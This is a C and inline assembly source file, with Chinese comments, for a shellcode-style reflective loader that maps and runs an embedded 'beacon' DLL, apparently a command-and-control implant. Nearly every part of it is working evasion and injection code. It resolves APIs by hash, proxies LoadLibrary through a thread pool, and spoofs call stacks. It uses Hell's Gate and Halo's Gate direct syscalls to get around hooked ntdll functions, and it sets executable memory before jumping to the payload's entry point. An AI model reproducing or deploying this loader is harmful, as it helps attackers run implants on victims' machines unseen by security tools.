#include <Windows.h>
#include <stdio.h>
#include "includes/projstructs.h"
#include "includes/peb_api.h"
#include "includes/utils.h"
#include "includes/dllbuff.h"


__asm__(
        ".global Start\n"      // 声明Setup为全局符号
        "Start:\n"
        "    push rsi\n"       // 保存rsi到栈中
        "    mov  rsi, rsp\n"  // 将rsi设置为当前栈指针
        "    and  rsp, 0xFFFFFFFFFFFFFFF0\n"    // 将栈对齐到16字节边界
        "    sub  rsp, 0x20\n" // 在栈上分配32字节空间
        "    call GtLoader\n"
        "    mov  rsp, rsi\n"  // 恢复栈指针
        "    pop  rsi\n"       // 恢复rsi的原始值
        "    pop  rcx\n"       // 将返回地址放入rcx
        "    add  rsp, 0x20\n" // 移除栈上的32字节空间
        "    and  rsp, 0xFFFFFFFFFFFFFFF0\n"    // 将栈对齐到16字节边界
        "    jmp  rcx\n"
        );

GRP_SEC(D) char wininet_name[] =  "wininet.dll";

GRP_SEC(B) UINT_PTR getLoadLibraryA() {
    UINT_PTR xLoadLibraryAddr;
    __asm__(
            "lea rax, [rip + xLoadLibrary]\n\t"
            "mov %0, rax\n\t"
            : "=r" (xLoadLibraryAddr)
            );
    return xLoadLibraryAddr;
}

GRP_SEC(B) void WorkCallback(PTP_CALLBACK_INSTANCE Instance, PVOID Context, PTP_WORK Work) {
    __asm__  (
            "mov rcx, rdx\n\t"            // 将 rdx 的值移到 rcx
            "xor rdx, rdx\n\t"            // 将 rdx 置零
            "call getLoadLibraryA\n\t"    // 调用 getLoadLibraryA 函数
            "jmp rax\n\t"                 // 跳转到 rax 中的地址
            );
}

GRP_SEC(B) void loadLibrary(void * lib_name) {
    Dll ntdll = {0};
    APIS api = {0};
    Dll ker32 = {0};
    ntdll.dllBase = loaded_module_base_from_hash(NTDLL);
    ker32.dllBase = loaded_module_base_from_hash(KERNEL32);
    parse_module_headers(&ntdll);
    parse_module_headers(&ker32);
    tWaitForSingleObject  WaitForSingleObject = xGetProcAddress_hash(WAITFORSINGLEOBJECT,&ker32);
    api.ntdll.TpSimpleTryPost = (tTPSIMPLETRYPOST) xGetProcAddress_hash(TPSIMPLETRYPOST,&ntdll);
    (api.ntdll.TpSimpleTryPost)((PTP_SIMPLE_CALLBACK)(unsigned char*)WorkCallback, lib_name, 0);
    WaitForSingleObject((HANDLE)-1, 0x100);
}

GRP_SEC(B) void InitLib() {
    loadLibrary(wininet_name);
    Dll wininet = {0};
    wininet.dllBase =  loaded_module_base_from_hash(WININET);
    parse_module_headers(&wininet);
}

// 检测是否为 PE 文件的函数
int IsPEFile(ULONG_PTR buffer) {
    // 检查 DOS 头
    IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*) buffer;
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        return 0; // 不是有效的 DOS 头
    }
    // 检查 PE 头
    IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*) (buffer + dosHeader->e_lfanew);
    if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) {
        return 0; // 不是有效的 PE 头
    }
    return 1; // 是有效的 PE 文件
}

GRP_SEC(Y) void end() {};

GRP_SEC(A) PVOID WINAPI GtLoader(VOID) {
    // load lib
    InitLib();
    uintptr_t end_addr = FUNC_ADDRESS(end);
    // 打印 end 函数的地址
    //printf("Address of end: 0x%p\n", (void *)end_addr);
    // 遍历内存，找到 PE 头
    IMAGE_DOS_HEADER *dos_header = NULL;
    IMAGE_NT_HEADERS *nt_headers = NULL;
    uintptr_t raw_base = 0;

    // 通常 PE 文件头在内存中是 4KB 对齐的，所以我们可以从 end 地址开始向下搜索
    for (uintptr_t addr = end_addr & ~0xFFF; addr < end_addr + 0x10000; addr += 0x10) {
        dos_header = (IMAGE_DOS_HEADER *)addr;
        // 检查 DOS 头的标志
        if (dos_header->e_magic == IMAGE_DOS_SIGNATURE) {
            nt_headers = (IMAGE_NT_HEADERS *)(addr + dos_header->e_lfanew);
            // 检查 NT 头的标志
            if (nt_headers->Signature == IMAGE_NT_SIGNATURE) {
                raw_base = addr; // 找到 PE 头地址
                break;
            }
        }
    }
    ULONG_PTR raw_beaconBase = (ULONG_PTR) raw_base;
    HEAP_APIS  heap = {0};
    getHeapApis(&heap);
    APIS * api                  = (Dll *)          heap.HeapAlloc(heap.GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(APIS));
    Dll * virtual_beacon        = (Dll *)          heap.HeapAlloc(heap.GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(Dll));
    Dll * raw_beacon            = (Dll *)          heap.HeapAlloc(heap.GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(Dll));
    Spoof_Struct * spoof_struct = (Spoof_Struct *) heap.HeapAlloc(heap.GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(Spoof_Struct));
    Dll * ntdll                 = (Dll *)          heap.HeapAlloc(heap.GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(Dll));

    raw_beacon->dllBase = (PVOID) raw_beaconBase;
    parse_module_headers(raw_beacon);

    setup_synthetic_callstack(spoof_struct);
    ntdll->dllBase = loaded_module_base_from_hash( NTDLL );
    parse_module_headers( ntdll );

    BYTE syscall_gadget_bytes[] = {0x0F,0x05,0xC3};
    void * syscall_gadget = FindGadget((LPBYTE)ntdll->text_section, ntdll->text_section_size, syscall_gadget_bytes, sizeof(syscall_gadget_bytes));
    getApis(api);

    // virtual memory
    virtual_beacon->dllBase = NULL;
    SIZE_T size;
    void * base;
    BYTE xorkey    = 0;
    DWORD oldprotect = 0;
    DWORD newprotect = 0;
    void* hMapFile          = NULL;
    size = ((BYTE*)raw_beacon->size + 0x10000);
    ULONG_PTR align = 0xFFFFFFFFFFFFF000;
    base = heap.HeapAlloc(heap.GetProcessHeap(),0x8,size); // 0x8 = zero out heap memory
    base = (void*)((BYTE*)base + 0x2000);
    base = (void*)((ULONG_PTR)base & align);
    if(base){
        oldprotect = 0;
        virtual_beacon->dllBase = base;
        HellsGate(getSyscallNumber(api->ntdll.pNtProtectVirtualMemory));
        ((tNtProt)HellDescent)(NtCurrentProcess(), &base, &size, raw_beacon->BeaconMemoryProtection, &oldprotect);
    }
    doSections(virtual_beacon, raw_beacon);
    doImportTable(api, virtual_beacon, raw_beacon);
    doRelocations(api, virtual_beacon, raw_beacon);

    virtual_beacon->EntryPoint = checkFakeEntryAddress_returnReal(raw_beacon, virtual_beacon);
    // If beacon.text is not RWX, change memory protections of virtual beacon.text section to RX
    if(raw_beacon->BeaconMemoryProtection == PAGE_READWRITE || raw_beacon->BeaconMemoryProtection == 0){
        oldprotect = 0;
        base = virtual_beacon->text_section;
        size = virtual_beacon->text_section_size;
        newprotect = PAGE_EXECUTE_READWRITE;
        // NtProtectVirtualMemory syscall
        HellsGate(getSyscallNumber(api->ntdll.pNtProtectVirtualMemory));
        ((tNtProt)HellDescent)(NtCurrentProcess(), &base, &size, newprotect, &oldprotect);
    }
    void * EntryPoint = virtual_beacon->EntryPoint;
    void * dllBase    = virtual_beacon->dllBase;

    heap.HeapFree(heap.GetProcessHeap(), 0, api);
    heap.HeapFree(heap.GetProcessHeap(), 0, virtual_beacon);
    heap.HeapFree(heap.GetProcessHeap(), 0, raw_beacon);
    heap.HeapFree(heap.GetProcessHeap(), 0, spoof_struct);
    ((DLLMAIN)EntryPoint)((HINSTANCE)dllBase, DLL_PROCESS_ATTACH, NULL);

    return EntryPoint;
}

//
//int main() {
//    GtLoader();
//}

__asm__(
        "getSyscallNumber: \n" // RAX,RCX,RDX
        "push rcx \n"
        "call findSyscallNumber \n"   // try to read the syscall directly
        "pop rcx \n"
        "test ax, ax \n"
        "jne syscallnothooked \n"
        "mov dx, 0 \n"                // index = 0
        "loopoversyscalls: \n"
        "push rcx \n"
        "push dx \n"
        "call halosGateUp\n"          // try to read the syscall above
        "pop dx \n"
        "pop rcx \n"
        "test ax, ax \n"
        "jne syscallnothookedup \n"
        "push rcx \n"
        "push dx \n"
        "call halosGateDown\n"        // try to read the syscall below
        "pop dx \n"
        "pop rcx \n"
        "test ax, ax \n"
        "jne syscallnothookeddown \n"
        "inc dx \n"                   // increment the index
        "jmp loopoversyscalls \n"
        "syscallnothooked: \n"
        "ret \n"
        "syscallnothookedup: \n"
        "sub ax, dx \n"
        "ret \n"
        "syscallnothookeddown: \n"
        "add ax, dx \n"
        "ret \n"

        "findSyscallNumber: \n"  // RAX,RCX,RSI,RDI
        "push rdi \n"
        "push rsi \n"
        "xor rsi, rsi \n"
        "xor rdi, rdi \n"
        "mov rsi, 0x00B8D18B4C \n"
        "mov edi, [rcx] \n"
        "cmp rsi, rdi \n"
        "jne error \n"
        "xor rax,rax \n"
        "mov ax, [rcx+4] \n"
        "jmp exitfsn \n"
        "error: \n"
        "xor rax, rax \n"
        "exitfsn:"
        "pop rsi \n"
        "pop rdi \n"
        "ret \n"

        "halosGateUp:          \n" // RAX,RSI,RDI,RDX
        "push rdi          \n"
        "push rsi          \n"
        "xor rsi, rsi      \n"
        "xor rdi, rdi      \n"
        "mov rsi, 0x00B8D18B4C \n"
        "xor rax, rax      \n"
        "mov al, 0x20      \n"
        "mul dx            \n"
        "add rcx, rax      \n"
        "mov edi, [rcx]    \n"
        "cmp rsi, rdi      \n"
        "jne HalosGateFail \n"
        "mov ax, [rcx+4]   \n"
        "jmp HalosGateExit \n"

        "halosGateDown:        \n" // RAX,RSI,RDI,RDX
        "push rdi          \n"
        "push rsi          \n"
        "xor rsi, rsi      \n"
        "xor rdi, rdi      \n"
        "mov rsi, 0x00B8D18B4C \n"
        "xor rax, rax      \n"
        "mov al, 0x20      \n"
        "mul dx            \n"
        "sub rcx, rax      \n"
        "mov edi, [rcx]    \n"
        "cmp rsi, rdi      \n"
        "jne HalosGateFail \n"
        "mov ax, [rcx+4]   \n"
        "HalosGateFail:        \n"
        "xor rax, rax      \n" // return 0x0 if fail to find syscall stub bytes
        "HalosGateExit:        \n"
        "pop rsi           \n"
        "pop rdi           \n"
        "ret               \n"

        "HellsGate:        \n" // Loads the Syscall number into the R11 register before calling HellDescent()
        "xor r11, r11  \n"
        "mov r11d, ecx \n" // Save Syscall Number in R11
        "ret           \n"

        "HellDescent:      \n" // Called directly after HellsGate
        "xor rax, rax  \n"
        "mov r10, rcx  \n"
        "mov eax, r11d \n" // Move the Syscall Number into RAX before calling syscall interrupt
        "syscall       \n"
        "ret           \n"
        );